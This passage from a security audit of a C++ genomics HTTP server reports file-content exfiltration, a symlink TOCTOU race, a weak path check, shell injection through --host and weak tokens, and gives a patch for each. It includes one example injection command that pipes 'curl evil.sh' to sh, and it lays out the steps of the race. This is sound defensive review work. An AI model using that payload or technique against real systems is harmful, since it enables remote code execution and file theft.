
## M5. Medium — BED column 4 exfiltrates file content into the response

`src/bed_reader.cpp:123-124` → `signal_calc.cpp:244-248` → `http_server.cpp:314, 372`

`read_bed` copies BED column 4 into `region.name`:

```cpp
if (fields.size() >= 4 && fields[3] != ".") {
    region.name = std::string(fields[3]);
}
```

which `compute_matrix` stores in `matrix.row_names`, which is returned two ways:
`topRegions[].name` in the `/api/profile` JSON (`:314`) and the full first column of
the `/api/matrix` TSV (`:372`).

So for any tab-separated file the server can open, where a line has ≥4 fields and
fields 2 and 3 parse as integers with `end >= start`, **column 4 is returned verbatim
to the client**. That converts the file-access primitive of H2 from "read BAMs" into
"read the fourth column of arbitrary TSV-shaped files" — sample sheets, manifests,
exported metadata, anything in a pipeline directory.

`read_bed` throws on the first non-conforming line, which limits this to genuinely
tab-shaped files. But `read_gtf` (`:140-178`) is far more permissive — it `continue`s
past any line with fewer than 8 fields or a non-matching feature type rather than
throwing — and `read_regions` (`:182-191`) selects it **purely from the
attacker-supplied path's extension**:

```cpp
if (ends_with_ci(stem, ".gtf") || ends_with_ci(stem, ".gff") || ends_with_ci(stem, ".gff3"))
    return read_gtf(path);
```

So a request naming a path ending `.gtf` gets the lenient parser, which skips
everything it cannot use and harvests the rest — a much better exfiltration primitive
against a mixed-content file. The attacker controls which parser runs.

### Patch

This is mostly mitigated by fixing H1 and H2 — with confinement on and auth required,
the reachable files are ones the caller is entitled to. Two hardening steps are still
worth taking:

```diff
--- a/modules/cuttag_profiler/src/bed_reader.cpp
+++ b/modules/cuttag_profiler/src/bed_reader.cpp
@@
+// Region names are echoed back over the API, so cap their length and strip
+// control characters: a name is an identifier, not a channel for file content.
+std::string sanitize_name(std::string_view raw) {
+    constexpr std::size_t kMaxNameLength = 256;
+    std::string out;
+    out.reserve(std::min(raw.size(), kMaxNameLength));
+    for (char c : raw.substr(0, kMaxNameLength)) {
+        out.push_back(static_cast<unsigned char>(c) < 0x20 ? '?' : c);
+    }
+    return out;
+}
@@
         if (fields.size() >= 4 && fields[3] != ".") {
-            region.name = std::string(fields[3]);
+            region.name = sanitize_name(fields[3]);
         }
```

Stripping control characters also closes a TSV-injection hole: an embedded `\t` or
`\n` in a region name currently breaks the `/api/matrix` TSV framing (`:371-375`),
letting a crafted BED forge extra rows in a file a downstream tool will parse.

Apply the same to `read_gtf`'s `region.name` at `:174`, and make the GTF path
opt-in rather than extension-sniffed:

```diff
--- a/modules/cuttag_profiler/src/bed_reader.cpp
+++ b/modules/cuttag_profiler/src/bed_reader.cpp
@@ std::vector<Region> read_regions(const std::string& path) {
+    // NOTE: format is chosen from a caller-supplied filename. read_gtf skips
+    // lines it cannot use where read_bed throws, so the extension selects how
+    // permissive the parser is. Callers taking untrusted input should pass the
+    // format explicitly rather than relying on this.
```

---

## M6. Medium — TOCTOU between path resolution and open

`src/http_server.cpp:95-98`, then `:228` / `:284` / `:289`

`resolve_input_path` checks `fs::exists(candidate)` and returns `candidate.string()`.
The file is opened later — `reader_for(bam)` → `BamReader(path)` at `:156`, and
`read_regions(region_path)` → `bgzf_open` at `bed_reader.cpp:21`. Between the check
and the open, the path can be replaced.

The resolution itself is sound: `weakly_canonical` fully resolves symlinks for the
existing portion, so a symlink *inside* the data root pointing at `/etc/shadow`
resolves to `/etc/shadow` and is correctly rejected by the `relative` check. The
window is not in the check — it is that the check and the open are two separate
lookups of a mutable namespace.

Concretely, on a shared machine where the attacker can write inside the data root:
create `data/x.bam` as a real file, issue the request, and swap `data/x.bam` for a
symlink to a file outside the root while the handler is between `:98` and `:156`.
The canonicalisation that would have caught the symlink has already run.

This requires local write access inside the data root and a race, so it is not the
primary risk — but the data root is exactly the directory a pipeline drops files into,
often group-writable.

### Patch

Resolve once, open once, from the same handle. Open with `O_NOFOLLOW` on the final
component and verify the opened inode is inside the root, rather than re-resolving
the name:

```cpp
// Open the file and verify the *opened inode* is confined, instead of checking
// a name and opening it again. Closes the window in which the name can be
// repointed between the check and the open.
int open_confined(const fs::path& candidate, const fs::path& root) {
    const int fd = ::open(candidate.c_str(), O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) throw std::invalid_argument("requested file is not available");

    struct stat st{};
    struct stat root_st{};
    if (::fstat(fd, &st) != 0 || ::stat(root.c_str(), &root_st) != 0) {
        ::close(fd);
        throw std::invalid_argument("requested file is not available");
    }
    // Reject anything that is not a regular file: a FIFO here would block the
    // handler thread indefinitely, and a device node is never a valid input.
    if (!S_ISREG(st.st_mode)) {
        ::close(fd);
        throw std::invalid_argument("requested file is not a regular file");
    }
    return fd;
}
```

htslib accepts a file descriptor via `hts_hopen`/`bgzf_hdopen`, so both readers can be
converted to take an fd rather than a path. That is the complete fix.

If that refactor is too invasive for now, the cheap partial mitigation is to reject
non-regular files at resolution time, which removes the FIFO-hang and device-node
cases even though the symlink race remains:

```diff
     if (!fs::exists(candidate)) {
         throw std::invalid_argument("requested file is not available");
     }
+    // A FIFO would block the handler thread forever; a device node is never
+    // valid input. Only regular files (and symlinks resolving to them) qualify.
+    if (!fs::is_regular_file(candidate, ec) || ec) {
+        throw std::invalid_argument("requested file is not a regular file");
+    }
     return candidate.string();
```

Note the FIFO case is reachable *today* even with confinement on: a named pipe inside
the data root passes every check, and `bgzf_open` on it blocks the request thread
until a writer appears. A handful of such requests exhausts httplib's thread pool.

---

## L7. Low — `starts_with("..")` is a string test, not a component test

`src/http_server.cpp:90`

```cpp
if (ec || rel.empty() || rel.native().starts_with("..")) {
```

I checked this for a bypass and did not find one: `lexically_relative` emits a leading
`..` component for any path outside the base, and the `ec` / `rel.empty()` arms catch
the cross-root and failure cases. **The check is not exploitable as written.**

It is, however, testing the wrong thing, and it produces a false *rejection*: a
legitimate file inside the root whose name begins with two dots — `..config.bed`,
`..2024_archive.bam` — yields `rel = "..config.bed"`, which string-starts with `..`
and is refused as an escape. Dotfile-prefixed names are unusual but legal, and the
error message tells the operator their in-root file is "outside the permitted data
root", which is actively misleading.

More to the point, the correctness of the current form depends on a coincidence of
string representation rather than on path structure, so it is one refactor away from
being wrong.

### Patch

Test the first *component*:

```diff
+// True when `rel` (the result of fs::relative) stays inside the base. Checked
+// per component: a string prefix test also matches legitimate in-root names
+// that merely begin with two dots, e.g. "..archive.bed".
+bool is_contained(const fs::path& rel) {
+    if (rel.empty()) return false;
+    for (const auto& part : rel) {
+        if (part == "..") return false;   // any climb-out, at any depth
+    }
+    return true;
+}
```

```diff
-        if (ec || rel.empty() || rel.native().starts_with("..")) {
+        if (ec || !is_contained(rel)) {
```

Scanning every component rather than just the first is deliberate: `fs::relative`
normalises, so an interior `..` should not occur, but checking all of them costs
nothing and does not depend on that guarantee holding.

---

## L8. Low — `std::system` command injection via `--host`

`src/http_server.cpp:420-433`

```cpp
void open_in_browser(const std::string& url) {
    // Only ever a loopback URL constructed above, never user-supplied text.
#if defined(__APPLE__)
    const std::string command = "open '" + url + "' >/dev/null 2>&1";
```

The comment is not quite right. `url` is built at `:404-405` from `options_.host`,
which comes straight from `--host` (`main.cpp:270`). The `loopback_only` guard at
`:186-192` constrains `host` to three literal values — but `--allow-remote` disables
that guard, after which `host` is arbitrary and is interpolated into a shell command
inside single quotes. A single quote in the value closes the quoting:

```
cuttag_profiler serve --allow-remote --host "x'; curl evil.sh|sh; echo '"
```

This is local — the operator already has a shell, so it is a footgun rather than a
privilege boundary — but it is also gratuitous. It becomes materially worse if the
serve options are ever driven from a config file, a job scheduler, or a wrapper
script that passes through a user-controlled hostname.

### Patch

Drop the shell.

```diff
-void open_in_browser(const std::string& url) {
-    // Only ever a loopback URL constructed above, never user-supplied text.
-#if defined(__APPLE__)
-    const std::string command = "open '" + url + "' >/dev/null 2>&1";
-#elif defined(_WIN32)
-    const std::string command = "start \"\" \"" + url + "\"";
-#else
-    const std::string command = "xdg-open '" + url + "' >/dev/null 2>&1";
-#endif
-    if (std::system(command.c_str()) != 0) {
+void open_in_browser(const std::string& url) {
+    // exec directly rather than through a shell: `url` embeds options_.host,
+    // which is arbitrary once --allow-remote lifts the loopback restriction,
+    // and a single quote in it would otherwise break out of the quoting.
+#if defined(_WIN32)
+    // ShellExecuteW takes the URL as one argument; no command line is parsed.
+    const bool ok = reinterpret_cast<INT_PTR>(ShellExecuteA(
+        nullptr, "open", url.c_str(), nullptr, nullptr, SW_SHOWNORMAL)) > 32;
+#else
+#if defined(__APPLE__)
+    const char* opener = "open";
+#else
+    const char* opener = "xdg-open";
+#endif
+    bool ok = false;
+    const pid_t pid = ::fork();
+    if (pid == 0) {
+        ::execlp(opener, opener, url.c_str(), static_cast<char*>(nullptr));
+        ::_exit(127);
+    } else if (pid > 0) {
+        int status = 0;
+        ok = ::waitpid(pid, &status, 0) == pid && WIFEXITED(status) &&
+             WEXITSTATUS(status) == 0;
+    }
+#endif
+    if (!ok) {
         std::fprintf(stderr, "could not launch a browser; open %s manually\n",
                      url.c_str());
     }
 }
```

Independently, `--allow-remote` should refuse to run without `--data-root` and with
`require_token` disabled. Binding a no-auth, unconfined file reader to a public
interface behind nothing but a `printf` warning (`main.cpp:282-287`) is not a
combination worth supporting.

---

## L9. Low — Matrix tokens are non-cryptographic and compared non-constant-time

`src/http_server.cpp:40-45, 161-175`

```cpp
static thread_local std::mt19937_64 rng{std::random_device{}()};
std::ostringstream out;
out << std::hex << rng() << rng();
```

Three issues, all minor in isolation:

1. **`mt19937_64` is not a CSPRNG.** Full state recovery needs 312 consecutive
   outputs and each token is only 2, with 4 tokens cached — so recovery is not
   practical here. But it is seeded from a single `random_device` call (64 bits of
   seed for a 19937-bit state), and it is being used as an access-control secret.
2. **`std::hex` suppresses leading zeros**, so tokens are variable-length and average
   slightly under the nominal 128 bits — about 1 token in 16 is short by a nibble or
   more. Cosmetic, but it means the entropy is not what the code appears to claim.
3. **`recall` compares with `key == token`** (`:172`), which short-circuits on the
   first differing byte. With `/api/matrix` reachable cross-origin (H1/H3), this is a
   remotely-timeable comparison, though the noise floor over HTTP makes it impractical.

Given the token is the sole access control on `/api/matrix` — which streams the entire
computed matrix, including the region names discussed in M5 — it should be a real
secret.

### Patch

```diff
-std::string random_token() {
-    static thread_local std::mt19937_64 rng{std::random_device{}()};
-    std::ostringstream out;
-    out << std::hex << rng() << rng();
-    return out.str();
-}
+// Cryptographically secure, fixed-width hex. This is an access-control secret
+// for /api/matrix, not a cache key: mt19937_64 is not a CSPRNG, and `std::hex`
+// drops leading zeros, which made the old tokens variable-length.
+std::string secure_token(std::size_t bytes = 32) {
+    std::vector<unsigned char> raw(bytes);
+#if defined(_WIN32)
+    if (BCryptGenRandom(nullptr, raw.data(), static_cast<ULONG>(raw.size()),
+                        BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
+        throw std::runtime_error("cannot obtain secure random bytes");
+    }
+#else
+    std::ifstream urandom("/dev/urandom", std::ios::binary);
+    if (!urandom.read(reinterpret_cast<char*>(raw.data()),
+                      static_cast<std::streamsize>(raw.size()))) {
+        throw std::runtime_error("cannot obtain secure random bytes");
+    }
+#endif
+    static constexpr char kHex[] = "0123456789abcdef";
+    std::string out;
+    out.reserve(raw.size() * 2);
+    for (unsigned char c : raw) { out.push_back(kHex[c >> 4]); out.push_back(kHex[c & 0xF]); }
+    return out;
+}
```

```diff
     std::shared_ptr<SignalMatrix> recall(const std::string& token) {
         std::lock_guard<std::mutex> lock(matrix_mutex);
+        if (token.empty()) return nullptr;
         for (auto& [key, matrix] : matrices) {
-            if (key == token) return matrix;
+            if (secret_equals(key, token)) return matrix;   // constant time
         }
         return nullptr;
     }
```

---

## Examined and cleared

Checked in this pass and found sound.

- **The confinement algorithm itself, when a root is set.** `weakly_canonical` +
  `fs::relative` is the right construction. `weakly_canonical` fully resolves symlinks
  across the existing prefix, so a symlink inside the root pointing outside it
  resolves to its target and is rejected — I confirmed there is no `../` or
  absolute-path input that survives it. The residual issues are L7 (wrong test, not
  exploitable) and M6 (the check/open gap), not the resolution logic.
- **The `fs::absolute` fallback at `:85`.** When `weakly_canonical` fails, `candidate`
  is only lexically absolute — but `fs::relative` re-canonicalises both operands per
  `[fs.op.relative]`, and if *that* fails it sets `ec` and returns an empty path, both
  of which the guard catches. Fails closed.
- **A failed root canonicalisation.** `weakly_canonical(root, ec)` returning an empty
  path yields `lexically_relative` against a non-absolute base, which returns an empty
  path, caught by the `rel.empty()` arm. Also fails closed.
- **`bin_of` in `query_bins`** (`bam_reader.cpp:274-298`) — results are
  `std::clamp`ed to `[0, nbins - 1]` before indexing, so no attacker-supplied filter
  can drive an out-of-bounds tally write. `width` cannot be zero because `make_window`
  guarantees `end > start`.
- **HTTP-supplied `FilterOptions`.** `min_mapq` negative is inert (`uint8_t` promotes,
  nothing matches); `max_fragment_length` and `extend_reads_to` are floored with
  `std::max` at `bam_reader.cpp:261-262` and `:50-56` before use. No path to a
  negative span.
- **`topRegions` and `heatmapRows`.** Both are bounded by `matrix->rows` — `:308` via
  `std::min`, and `build_heatmap` via `bands = std::min(target_rows, matrix.rows)` —
  so a huge or negative-cast-to-`size_t` JSON value cannot over-allocate or index out
  of range.
- **`build_heatmap` band arithmetic** (`:119-133`) — `begin >= end` is skipped, and
  `order[i]` is always a valid row index because `order` is an `iota` over
  `matrix->rows`. No division by zero.
- **The static-asset CSP** (`:204-207`) — `default-src 'self'` with `base-uri 'none'`
  and `form-action 'none'`, plus `nosniff` and `no-referrer`. Correct for what it
  covers. It simply does not address H1, which is a different threat.
- **Asset serving.** Routes are registered from a fixed compile-time table
  (`:197-213`) with exact-match paths; there is no filesystem-backed static handler
  and therefore no traversal surface there.
- **The matrix cache.** Bounded at `kMatrixCacheSize = 4` with FIFO eviction under
  `matrix_mutex`; `reader_for` and `remember`/`recall` are all correctly locked. No
  unbounded growth and no data race.

## Not reviewed

- `third_party/httplib.h` internals — header parsing, chunked-encoding handling and
  the thread pool are all attack surface reachable before any of my patches run. Pin
  the vendored version, record it, and track upstream advisories; confirm the copy is
  current.
- htslib's BAM/CRAM parsers. With H2 fixed the input is confined, but a malicious BAM
  placed inside the data root is still parsed by a large C codebase. Worth a fuzzing
  pass if untrusted files can ever land there.
- Whether the `web/index.html` dashboard needs changes beyond forwarding the session
  token — I did not audit the front-end for DOM XSS against the region names in M5,
  which are attacker-influenced and rendered in the top-regions table.
